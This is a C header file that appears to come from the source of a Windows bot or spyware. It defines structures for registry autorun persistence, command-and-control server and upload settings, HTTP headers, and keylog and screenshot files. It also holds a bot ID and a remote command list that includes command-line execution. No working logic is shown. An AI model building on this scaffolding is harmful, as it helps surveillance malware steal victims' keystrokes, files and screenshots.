#ifndef STRUCTS_H
#define STRUCTS_H

#include <Windows.h>
#include <stdio.h>
#include "defines.h"

typedef struct{
	char KEY_PATH[MAX_REG];
	char KEY_NAME[MAX_REG];
	char AUTORUN_PATH[MAX_REG];
	char AUTORUN_NAME[MAX_REG];
	char COPY_PATH[MAX_REG];
	char COPY_PATH_2000_xp[MAX_REG];
}REG_CONFIG;

typedef struct{
	wchar_t ADDRESS[MAX_SERVER];
	int PORT;
	char HELLO_PATH[MAX_SERVER];
	char DATA_UPLOAD_PATH[MAX_SERVER];
}SERVER_CONFIG;

typedef struct{
	wchar_t GET[MAX_HTTP];
	wchar_t POST[MAX_HTTP];
	wchar_t POST_HEAD[MAX_HTTP];
	char POST_HEAD_BEGIN[MAX_HTTP];
	char POST_HEAD_END[MAX_HTTP];
}HTTP_CONFIG;

typedef struct{
	char KEYLOG[MAX_FILE];
	char SEARCH[MAX_FILE];
	char SEARCH_UPLOADED[MAX_FILE];
	char SCREENSHOT[MAX_FILE];
}FILE_CONFIG;

typedef struct{
	char key[MAX_CRYPT_KEY_LEN];
}KEY_CRYPT_CONFIG, *PKEY_CRYPT;

typedef struct{
	REG_CONFIG			reg;
	SERVER_CONFIG		server;
	HTTP_CONFIG			http;
	FILE_CONFIG			file;
	KEY_CRYPT_CONFIG 	key;
}CORE_CONFIG, *PCORE_CONFIG;


enum COMMAND_SET{
	CMD_UNINSTALL,
	CMD_UPDATE,
	CMD_SCREENSHOT,
	CMD_SEARCHFILE,
	CMD_COMMANDLINE
};
typedef struct{
	int id;
	char cmd[MAX_NUM_CMD];
	char data[MAX_DATA_CONTAIN];
	bool active;
}COMMAND;

static COMMAND ListCommand[] = {
	{ CMD_UNINSTALL, RC_UNINSTALL, "", false },
	{ CMD_SCREENSHOT, RC_SCREENSHOT,"", false },
	{ CMD_SEARCHFILE, RC_SEARCHFILE,"", false },
	{ CMD_COMMANDLINE, RC_COMMANDLINE,"", false }
};

typedef struct{
	COMMAND *ListCommand;		
}REMOTESCRIPT_DATA;

typedef struct{
	char cBotID[MAX_BOT_ID_LEN]; // bot identification
	CORE_CONFIG coreConfig;
	REMOTESCRIPT_DATA remoteData;
	HANDLE hMutex;
}CORE_DATA, *PCORE_DATA;
#endif